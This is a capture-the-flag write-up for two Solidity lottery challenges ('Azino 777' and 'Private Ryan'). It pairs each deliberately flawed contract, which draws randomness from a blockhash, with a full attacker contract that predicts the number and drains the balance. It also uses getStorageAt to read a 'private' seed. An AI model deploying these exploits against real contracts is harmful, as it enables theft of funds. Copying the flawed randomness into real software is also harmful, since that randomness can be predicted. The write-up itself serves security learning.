# ether-hack

### My Ether Hack Solutions

# Challenge 1 : Azino 777

```Solidity
pragma solidity ^0.4.16;

contract Azino777 {

  function spin(uint256 bet) public payable {
    require(msg.value >= 0.01 ether);
    uint256 num = rand(100);
    if(num == bet) {
        msg.sender.transfer(this.balance);
    }
  }

  //Generate random number between 0 & max
  uint256 constant private FACTOR =  1157920892373161954235709850086879078532699846656405640394575840079131296399;
  function rand(uint max) constant private returns (uint256 result){
    uint256 factor = FACTOR * 100 / max;
    uint256 lastBlockNumber = block.number - 1;
    uint256 hashVal = uint256(block.blockhash(lastBlockNumber));

    return uint256((uint256(hashVal) / factor)) % max;
  }

  function() public payable {}
}
```

Solution : Challenge 1
---
We will win this lottery if generated random number and bet both are the same then we will win this, for this make contract and calculate first your `rand` function and get the return value and make the spin call with `0.01 ether` and `100` as max, Here's Your Full Code.

```solidity
contract Attack {
    Azino777 azino = Azino777("Azino777_ADDRESS");
    uint256 constant private FACTOR =  1157920892373161954235709850086879078532699846656405640394575840079131296399;

  function solve(uint256 max) public payable {
    uint256 factor = FACTOR * 100 / max;
    uint256 lastBlockNumber = block.number - 1;
    uint256 hashVal = uint256(block.blockhash(lastBlockNumber));
    uint256 bet =  uint256((uint256(hashVal) / factor)) % max;
    azino.spin.value(msg.value)(bet);
  }

  function withdraw() public {
       msg.sender.transfer(address(this).balance);
  }

   function() public payable {}

}
```

# Challenge 2: Private Ryan

```solidity
pragma solidity ^0.4.16;

contract PrivateRyan {
  uint private seed = 1;

  function PrivateRyan() {
    seed = rand(256);
  }

  function spin(uint256 bet) public payable {
    require(msg.value >= 0.01 ether);
    uint256 num = rand(100);
    seed = rand(256);
    if(num == bet) {
        msg.sender.transfer(this.balance);
    }
  }

  //Generate random number between 0 & max
  uint256 constant private FACTOR =  1157920892373161954235709850086879078532699846656405640394575840079131296399;
  function rand(uint max) constant private returns (uint256 result){
    uint256 factor = FACTOR * 100 / max;
    uint256 blockNumber = block.number - seed;
    uint256 hashVal = uint256(block.blockhash(blockNumber));

    return uint256((uint256(hashVal) / factor)) % max;
  }

  function() public payable {}
}
```

Solution : Challenge 2
---
Same as the last one but here we need seed which is private deploy the Private ryan contact and whichever network you are one use web3.js lib 
```
await web3.eth.getStorageAt("CONTRACT_ADDRESS",0);
```
it will give you hex value convert it into the dec and then rest is simple here is full code replace value.

```solidity
contract Attack {
    PrivateRyan privateRyan = PrivateRyan("PrivateRyan_ADDRESS");
     uint256 constant private FACTOR =  1157920892373161954235709850086879078532699846656405640394575840079131296399;
     uint256 seed = YOUR_SEED_IN_DEC;


    function rand(uint256 max) public payable{
    uint256 factor = FACTOR * 100 / max;
    
   
    uint256 blockNumber = block.number - seed;
    uint256 hashVal = uint256(block.blockhash(blockNumber));

    uint256 bet=   uint256((uint256(hashVal) / factor)) % max;

    privateRyan.spin.value(msg.value)(bet);
    }

    function withdraw() public {
        msg.sender.transfer(this.balance);
    }

      function() public payable {}
}
```
